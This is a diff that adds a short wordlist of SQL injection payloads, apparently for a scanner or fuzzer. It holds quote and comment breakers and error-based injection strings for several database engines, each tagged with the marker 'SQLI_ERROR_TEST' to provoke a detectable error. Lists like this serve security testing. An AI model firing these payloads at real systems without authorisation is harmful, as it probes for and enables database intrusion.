@@ -1,0 +1,17 @@
+'
+"
+')
+'
+') 
+')--
+'--
+"--
+'/*
+*/ 
+''
+''''
+' AND 1=CONVERT(int,'SQLI_ERROR_TEST')-- -
+' AND CAST('SQLI_ERROR_TEST' AS int)-- -
+' AND extractvalue(1,concat(0x7e,'SQLI_ERROR_TEST',0x7e))-- -
+' AND updatexml(1,concat(0x7e,'SQLI_ERROR_TEST',0x7e),1)-- -
+' AND GTID_SUBSET(CONCAT(0x7e,'SQLI_ERROR_TEST',0x7e),1337)-- -
